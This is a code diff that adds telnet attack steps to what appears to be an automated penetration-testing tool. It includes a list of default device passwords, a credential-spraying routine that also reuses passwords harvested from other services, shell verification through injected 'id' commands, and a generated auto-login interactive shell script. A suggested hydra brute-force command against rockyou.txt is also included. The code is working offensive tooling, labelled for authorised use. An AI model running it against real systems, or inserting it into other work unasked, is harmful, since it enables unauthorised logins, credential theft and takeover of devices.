@@ -2282,6 +2282,23 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
         return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if ni else "MEDIUM",
                 "summary": summ[:140]}
 
+    # 2bf) telnet-shell: an interactive telnet session was spawned (auto-login / no-auth)
+    if sid == "telnet-shell":
+        if "shell → " in output:
+            mm = re.search(r"shell → (.+)$", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
+        return None
+
+    # 2be) telnet-creds: default / reused telnet login worked → immediate access
+    if sid == "telnet-creds":
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"telnet creds: {shown}"[:140]}
+
     # 2bd) telnet-banner: unauthenticated shell (critical) → else banner / auth-required info
     if sid == "telnet-banner":
         no = re.search(r"^✗ NOAUTH unauthenticated shell — (.+)$", output, re.M)
@@ -3421,7 +3438,7 @@ _EXPLOIT_STEPS = {
     ],
     "telnet": [
         ("Banner + version → searchsploit; probe for a no-auth shell / backdoor prompt", "telnet-banner"),
-        "Default / known creds; careful, targeted brute (lockout-aware)",
+        ("Default / known / reused creds; targeted, lockout-aware", "telnet-creds"),
         "Sniff cleartext creds if you can MITM the segment",
         "Manual steps & further research",
     ],
@@ -12024,6 +12041,253 @@ def _tool_telnet_banner(ip: str, port: int, proto: str) -> str:
     return f"Telnet banner — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── Telnet step 2: known / default / reused credentials (targeted, lockout-safe) ──
+_TELNETCREDS_DEADLINE = 120       # s — wall-clock cap
+_TELNETCREDS_MAX = 60             # ceiling on login attempts (targeted, not a brute)
+_TELNET_DEFAULTS = [              # curated telnet / device defaults — not a wordlist
+    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "admin"), ("root", "password"),
+    ("root", "calvin"), ("root", "default"), ("root", "1234"), ("admin", "admin"), ("admin", ""),
+    ("admin", "password"), ("admin", "1234"), ("admin", "admin123"), ("administrator", "administrator"),
+    ("user", "user"), ("guest", "guest"), ("guest", ""), ("cisco", "cisco"), ("support", "support"),
+    ("ubnt", "ubnt"), ("pi", "raspberry"),
+]
+
+
+def _telnet_login_test(ip: str, port: int, user: str, pw: str) -> "bool | None":
+    """One telnet login on a fresh raw socket. True=valid (probe-verified), False=rejected,
+    None=connection error or an unauthenticated shell (no login to test)."""
+    import socket
+    import os
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(8)
+        s.connect((ip, port))
+    except OSError:
+        return None
+    try:
+        intro = _telnet_pump(s, budget=3.5)
+        tail = intro.rstrip()[-80:]
+        low = tail.lower()
+        asks_login = bool(_TELNET_PROMPT_LOGIN.search(tail)) or "login:" in low
+        asks_pass = bool(_TELNET_PROMPT_PASS.search(tail)) or low.endswith("password:")
+        if not asks_login and not asks_pass and re.search(r"[#$>]\s*$", tail):
+            return None                                      # no-auth shell — nothing to authenticate
+        if asks_login or not asks_pass:
+            s.sendall((user + "\r\n").encode())
+            p2 = _telnet_pump(s, budget=3.0)
+        else:
+            p2 = intro
+        if asks_pass or "password" in p2.lower() or _TELNET_PROMPT_PASS.search(p2):
+            s.sendall((pw + "\r\n").encode())
+        after = _telnet_pump(s, budget=3.0)
+        if re.search(r"(?i)incorrect|denied|failed|invalid|bad", p2 + after):
+            return False
+        mark = f"PSH{os.urandom(2).hex()}"                   # verify we actually landed in a shell
+        try:
+            s.sendall(f"id; echo {mark}$((6*7))\n".encode())
+            resp = _telnet_pump(s, budget=2.5)
+        except OSError:
+            resp = ""
+        if f"{mark}42" in resp or re.search(r"uid=\d+\(", resp):
+            return True
+        if re.search(r"[#$>]\s*$", after.rstrip()) and not (
+                _TELNET_PROMPT_LOGIN.search(after) or "login:" in after.lower()):
+            return True                                      # shell prompt, no re-login → likely in
+        return False
+    except OSError:
+        return None
+    finally:
+        try:
+            s.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+
+
+def _gather_telnet_creds(ip: str) -> list:
+    """(user, pass) telnet logins telnet-creds proved for this host ('telnet on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ telnet on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _tool_telnet_creds(ip: str, port: int, proto: str) -> str:
+    """Telnet step 2 tool: try a curated set of default/device telnet credentials plus any harvested
+    password (reuse across services) — targeted, NOT a wordlist brute, so it stays lockout-safe.
+    Each login is probe-verified (we confirm a real shell). Valid logins are saved to smb-creds
+    ('telnet on <host>') for reuse and spawn-shell. An unreachable host raises. Authorised only."""
+    import time
+    banner = next((o for s, o in fetch_scripts(ip, port, proto) if s == "telnet-banner"), "")
+    if "✗ NOAUTH" in banner:
+        return ("Telnet credentials — {0}:{1}\n\n"
+                "· unauthenticated shell already (telnet-banner) — no creds needed; "
+                "Privilege Escalation phase → spawn-shell (r1)").format(ip, port)
+
+    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]          # password reuse (no hashes)
+    candidates, seen = [], set()
+    for u, p in _TELNET_DEFAULTS + reused:
+        key = (u.lower(), p)
+        if key not in seen:
+            seen.add(key)
+            candidates.append((u, p, (u, p) not in _TELNET_DEFAULTS))    # (user, pass, is_reused)
+    candidates = candidates[:_TELNETCREDS_MAX]
+
+    deadline = time.time() + _TELNETCREDS_DEADLINE
+    valid, conn_err = [], 0
+    for user, pw, is_reused in candidates:
+        if time.time() > deadline:
+            break
+        r = _telnet_login_test(ip, port, user, pw)
+        if r is True:
+            valid.append((user, pw, is_reused))
+            break                                            # one working login is enough for a foothold
+        elif r is None:
+            conn_err += 1
+            if conn_err >= 5:
+                break
+    if conn_err >= 5 and not valid:
+        raise RuntimeError(f"{ip}:{port} — telnet not answering login attempts (down / not telnet?)")
+
+    if valid:                                                # persist to the canonical creds store
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for user, pw, _r in valid:
+            line = f"! {user}:{pw or '<blank>'} @ telnet on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(candidates)} cred(s) tried (defaults + reuse) · {len(valid)} valid"]
+    for user, pw, is_reused in valid:
+        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}" + ("  (reused)" if is_reused else ""))
+    if valid:
+        lines.append("· spawn it: Privilege Escalation phase → spawn-shell (r1)")
+    else:
+        lines.append("· no default/reused login worked")
+        lines.append(f"· full brute (only if no lockout): hydra -l <user> -P "
+                     f"/usr/share/wordlists/rockyou.txt telnet://{ip}")
+    return f"Telnet credentials — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+# ── Telnet foothold: auto-login interactive session (spawned via spawn-shell) ──
+_TELNET_SHELL_SRC = r'''
+import socket, sys, os, select, time
+IP = __IP__
+PORT = __PORT__
+USER = __USER__
+PW = __PW__
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((IP, PORT))
+st = [0]; opt = [None]
+def feed(data):
+    out = bytearray(); rep = bytearray()
+    for b in data:
+        if st[0] == 0:
+            if b == 255: st[0] = 1
+            else: out.append(b)
+        elif st[0] == 1:
+            if b in (251, 252, 253, 254): opt[0] = b; st[0] = 2
+            elif b == 250: st[0] = 3
+            elif b == 255: out.append(255); st[0] = 0
+            else: st[0] = 0
+        elif st[0] == 2:
+            if opt[0] == 253: rep += bytes((255, 252, b))
+            elif opt[0] == 251: rep += bytes((255, 254, b))
+            st[0] = 0
+        elif st[0] == 3:
+            st[0] = 4 if b == 255 else 3
+        elif st[0] == 4:
+            st[0] = 0 if b == 240 else 3
+    if rep:
+        try: s.sendall(bytes(rep))
+        except OSError: pass
+    return bytes(out)
+if USER:
+    buf = b""; su = sp = False; end = time.time() + 15
+    while time.time() < end and not sp:
+        r, _, _ = select.select([s], [], [], 0.5)
+        if s in r:
+            try: d = s.recv(4096)
+            except OSError: break
+            if not d: break
+            c = feed(d); buf += c
+            os.write(1, c)
+            low = buf.lower()
+            if not su and (b"login:" in low or b"username:" in low):
+                s.sendall((USER + "\r\n").encode()); su = True; buf = b""
+            elif su and not sp and b"password" in low:
+                s.sendall((PW + "\r\n").encode()); sp = True; buf = b""
+try:
+    import termios, tty
+    old = termios.tcgetattr(0); tty.setraw(0)
+except Exception:
+    old = None
+try:
+    while True:
+        r, _, _ = select.select([0, s], [], [])
+        if 0 in r:
+            d = os.read(0, 1024)
+            if not d: break
+            s.sendall(d)
+        if s in r:
+            d = s.recv(4096)
+            if not d: break
+            os.write(1, feed(d))
+finally:
+    if old is not None:
+        try: termios.tcsetattr(0, termios.TCSADRAIN, old)
+        except Exception: pass
+    s.close()
+sys.stdout.write("\n[*] telnet session closed - press enter to close this tab\n")
+try: input()
+except Exception: pass
+'''
+
+
+def _tool_telnet_shell(ip: str, port: int, proto: str) -> str:
+    """Telnet foothold (INTERACTIVE): spawn an auto-logging-in telnet session in a new terminal —
+    using a telnet-creds cred, or straight in when telnet-banner found an unauthenticated shell.
+    Headless: prints the plain `telnet` command. Authorised targets only."""
+    import tempfile
+    banner = next((o for s, o in fetch_scripts(ip, port, proto) if s == "telnet-banner"), "")
+    noauth = "✗ NOAUTH" in banner
+    creds = _gather_telnet_creds(ip)
+    if creds:
+        if len(creds) == 1:
+            user, pw = creds[0]
+        else:
+            print(f"\n{BOLD}telnet creds{RESET}")
+            for i, (u, _p) in enumerate(creds, 1):
+                print(f"  {BOLD}{i}{RESET}  {u}")
+            v = _ask("pick cred [1-N, blank = 1]:")
+            user, pw = creds[int(v) - 1] if (v and v.isdigit() and 1 <= int(v) <= len(creds)) else creds[0]
+        who = user
+    elif noauth:
+        user, pw, who = "", "", "no-auth"
+    else:
+        print(f"\n{YELLOW}no telnet foothold yet{RESET} — run {BOLD}telnet-banner (r1){RESET} "
+              f"(no-auth shell) or {BOLD}telnet-creds (r2){RESET} (a valid login) first.")
+        return "telnet-shell: no telnet foothold (run telnet-banner r1 / telnet-creds r2)"
+
+    src = (_TELNET_SHELL_SRC.replace("__IP__", repr(ip)).replace("__PORT__", str(port))
+           .replace("__USER__", repr(user)).replace("__PW__", repr(pw)))
+    fd, spath = tempfile.mkstemp(prefix="pshunter_telnet_", suffix=".py")
+    with os.fdopen(fd, "w") as fh:
+        fh.write(src)
+    used = _open_listener_terminal(spath)
+    if not used:
+        _safe_unlink(spath)
+        creds_note = f" (log in as {who})" if who != "no-auth" else " (drops straight to a shell)"
+        print(f"{YELLOW}headless{RESET} — run: {BOLD}telnet {ip} {port}{RESET}{DIM}{creds_note}{RESET}")
+        return f"telnet-shell: headless — telnet {ip} {port} shown"
+    print(f"{GREEN}▶ telnet session opened in a new {used} window{RESET} {DIM}→ {who}@{ip}:{port}{RESET}")
+    return f"telnet-shell: shell → {who}@{ip}:{port}"
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -12052,6 +12316,13 @@ def _spawn_shell_paths(ip: str) -> list:
         if _parse_cmdi_vectors(ip, p, pr):
             paths.append(("HTTP", "reverse shell over a confirmed cmdi RCE channel",
                           "foothold", p, pr))
+    for p, pr in by_key.get("telnet", []):
+        banner = next((o for s, o in fetch_scripts(ip, p, pr) if s == "telnet-banner"), "")
+        noauth = "✗ NOAUTH" in banner
+        creds = _gather_telnet_creds(ip)
+        if noauth or creds:
+            detail = ("auto-login (proven cred)" if creds else "unauthenticated shell (no creds)")
+            paths.append(("Telnet", detail, "telnet-shell", p, pr))
     return paths
 
 
@@ -12151,6 +12422,8 @@ _STEP_TOOLS = {
     "tftp-write": ("test anonymous write (WRQ throwaway) — non-reversible, no DELETE", _tool_tftp_write),
     "tftp-next": ("manual TFTP steps (context-aware, reference only)", _tool_tftp_next),
     "telnet-banner": ("telnet banner + version → searchsploit; probe no-auth shell (raw socket)", _tool_telnet_banner),
+    "telnet-creds": ("default + reused telnet creds (raw socket, probe-verified, lockout-safe)", _tool_telnet_creds),
+    "telnet-shell": ("telnet foothold → auto-login interactive session (spawned)", _tool_telnet_shell),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -12229,6 +12502,8 @@ _STEP_TOOL_RUNS = {
     "tftp-write":       ("Python (raw UDP)", None),
     "tftp-next":        ("reference · no scan", None),
     "telnet-banner":    ("Python (raw socket) + searchsploit", None),
+    "telnet-creds":     ("Python (raw socket)", f"{_mins(_TELNETCREDS_DEADLINE)} min"),
+    "telnet-shell":     ("Python (raw socket)", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
